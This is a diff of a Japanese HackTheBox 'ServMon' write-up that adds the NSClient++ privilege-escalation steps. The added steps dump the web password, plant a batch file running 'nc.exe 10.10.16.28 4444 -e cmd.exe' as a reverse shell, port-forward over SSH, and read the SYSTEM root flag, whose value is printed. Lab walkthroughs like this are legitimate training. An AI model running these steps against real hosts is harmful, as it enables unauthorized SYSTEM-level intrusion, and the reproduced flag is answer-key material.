@@ -259,7 +259,6 @@ nadine@SERVMON C:\Users\Nadine>dir "c:\Program Files"
 ```
 nsclientには権限昇格のテクニックがあるらしい  
 ようは管理者権限で動作しているweb経由で攻撃者のプログラムを実行させるイメージ  
-ただマシンがくそ重いので断念、なんかapi経由だと楽にエクスプロイトできるらしいけど
 ```sh
 └─$ searchsploit -m 46802
   Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
@@ -334,4 +333,65 @@ or
 
 Risk:
 The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
+```
+PoC１番、webログイン用のパスワード確認
+```powershell
+nadine@SERVMON C:\Users\Nadine>"C:\Program Files\NSClient++\nscp.exe" web -- password --display
+Current password: ew2x6SsGTxjRwXOT
+```
+PoC３番、nc.exeおよびそれを実行するバッチを配送
+```powershell
+└─$ cat test.bat                                     
+@echo off
+cmd /c "C:\Users\Nadine\nc.exe 10.10.16.28 4444 -e c:\windows\system32\cmd.exe" 
+                                                                                                                                                                       
+└─$ scp test.bat nadine@10.129.61.85:/Users/nadine/ 
+nadine@10.129.61.85's password: 
+test.bat                                                                                                                             100%   91     0.1KB/s   00:01
+
+└─$ cp /usr/share/windows-resources/binaries/nc.exe .
+
+└─$ scp nc.exe nadine@10.129.61.85:/Users/nadine/    
+nadine@10.129.61.85's password: 
+nc.exe                                                                                                                               100%   58KB  10.5KB/s   00:05
+```
+PoC５番、スクリプトの登録  
+webログインできなかったが、設定ファイルを確認するとipアドレスでアクセス制限していた
+```powershell
+nadine@SERVMON C:\Users\Nadine>type "c:\program files\nsclient++\nsclient.ini" | find "127.0.0.1"
+allowed hosts = 127.0.0.1
+```
+ということでsshローカルポートフォワーディング
+```sh
+└─$ ssh -L 8443:127.0.0.1:8443 nadine@10.129.61.85       
+nadine@10.129.61.85's password: 
+Microsoft Windows [Version 10.0.17763.864]           
+(c) 2018 Microsoft Corporation. All rights reserved. 
+                                                     
+nadine@SERVMON C:\Users\Nadine>
+```
+PoCだけじゃよくわからんかったので、[公式サイト](https://nsclient.org/docs/howto/run_commands/#adding-custom-scripts)通りで設定  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/ServMon_03.png">  
+PoC６番、こちらも[公式サイト](https://nsclient.org/docs/howto/run_commands/#scheduling-commands)通りで設定  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/ServMon_04.png">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/ServMon_05.png">  
+PoC７番、画面右上「control」からrestartできたが、スケジュールが起動するまでめちゃめちゃ時間がかかるらしい  
+どうやら上タブ「queries」から登録したスクリプトを実行できた  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/ServMon_06.png">  
+ということでリバースシェル取得、system権限を確認  
+ルートフラグゲット
+```sh
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.28] from (UNKNOWN) [10.129.227.77] 50414
+Microsoft Windows [Version 10.0.17763.864]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\NSClient++>whoami
+whoami
+nt authority\system
+
+C:\Program Files\NSClient++>type c:\users\administrator\desktop\root.txt
+type c:\users\administrator\desktop\root.txt
+e63cb4c7f2e0ed8b089353f8cedc1be6
 ```
